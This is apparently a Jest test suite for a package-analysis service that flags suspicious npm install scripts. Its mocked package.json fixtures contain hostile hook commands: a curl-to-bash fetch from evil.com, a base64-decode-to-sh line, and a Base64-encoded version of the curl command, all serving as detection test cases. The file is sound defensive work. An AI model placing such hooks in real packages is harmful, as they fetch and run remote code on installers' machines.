import { AnalyzerService } from '../src/services/AnalyzerService';
import path from 'path';
import fs from 'fs';

// Mock specific FS calls if needed, but integration style on a fixture is better.
// For now, let's mock fs.readFileSync to avoid creating files.

jest.mock('fs');

describe('AnalyzerService', () => {
    let analyzer: AnalyzerService;

    beforeEach(() => {
        analyzer = new AnalyzerService();
        jest.clearAllMocks();
    });

    it('should detect suspicious curl | bash pattern', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'test-pkg',
            scripts: {
                install: 'curl http://evil.com | bash'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);
        // Mock path.dirname and join if strictly needed by implementation details, 
        // but Analyzer uses targetPath directly if checking file status logic allows.
        // Actually Analyzer logic: 
        // if (fs.statSync(targetPath).isDirectory()) ...
        // else dirPath = path.dirname(targetPath);

        const result = await analyzer.analyze('package.json');

        expect(result.packageName).toBe('test-pkg');
        expect(result.vulnerabilities.length).toBeGreaterThan(0);
        const descriptions = result.vulnerabilities.map(v => v.description);
        expect(descriptions).toEqual(expect.arrayContaining([expect.stringMatching(/Pipes content directly to bash/)]));
    });

    it('should detect suspicious base64 usage', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'test-pkg',
            scripts: {
                postinstall: 'echo "bWFsaWNpb3Vz" | base64 -d | sh'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);

        const result = await analyzer.analyze('package.json');

        // Should catch base64 AND | sh
        const descriptions = result.vulnerabilities.map(v => v.description);
        // We use arrayContaining to ensure at least these matchers are present
        expect(descriptions).toEqual(expect.arrayContaining([
            expect.stringMatching(/Base64 encoding\/decoding/),
            expect.stringMatching(/Pipes content directly to sh/)
        ]));
    });

    it('should recursively decode and detect hidden malware', async () => {
        // "curl http://evil.com | bash" encoded in Base64 is "Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo"
        const maliciousPayload = "Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo";
        const mockPackageJson = JSON.stringify({
            name: 'hidden-threat',
            scripts: {
                start: `echo "${maliciousPayload}" | base64 -d | sh`
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);

        const result = await analyzer.analyze('package.json');
        const descriptions = result.vulnerabilities.map(v => v.description);

        // It should find the *decoded* payload
        // It should find the *decoded* payload wrapper message
        expect(descriptions).toEqual(expect.arrayContaining([
            expect.stringMatching(/Obfuscated \(Base64\) payload detected/)
        ]));
    });

    it('should be safe with safe scripts', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'safe-pkg',
            scripts: {
                test: 'echo "hello world"'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);

        const result = await analyzer.analyze('package.json');
        expect(result.vulnerabilities.length).toBe(0);
    });
});
